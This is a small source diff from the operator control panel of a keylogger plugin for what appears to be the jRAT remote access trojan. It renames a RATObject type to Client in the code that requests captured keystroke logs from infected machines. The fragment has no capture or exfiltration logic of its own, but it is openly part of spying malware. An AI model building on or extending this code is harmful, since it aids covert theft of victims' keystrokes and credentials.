@@ -36,7 +36,7 @@ import se.jrat.plugin.keylogger.client.KeyloggerPlugin;
 import se.jrat.plugin.keylogger.client.HeartbeatThread;
 import jrat.api.BaseControlPanel;
 import jrat.api.PacketBuilder;
-import jrat.api.RATObject;
+import jrat.api.Client;
 
 @SuppressWarnings("serial")
 public class PanelKeylogger extends BaseControlPanel {
@@ -151,7 +151,7 @@ public class PanelKeylogger extends BaseControlPanel {
 					try {
 						getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOG_HEADER, getServer()) {
 							@Override
-							public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+							public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 								dos.writeUTF(year.toString());
 								dos.writeUTF(month.toString());
 								dos.writeUTF(day.toString());
@@ -182,7 +182,7 @@ public class PanelKeylogger extends BaseControlPanel {
 			
 			getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOGS_HEADER, getServer()) {
 				@Override
-				public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+				public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 
 				}
 			});
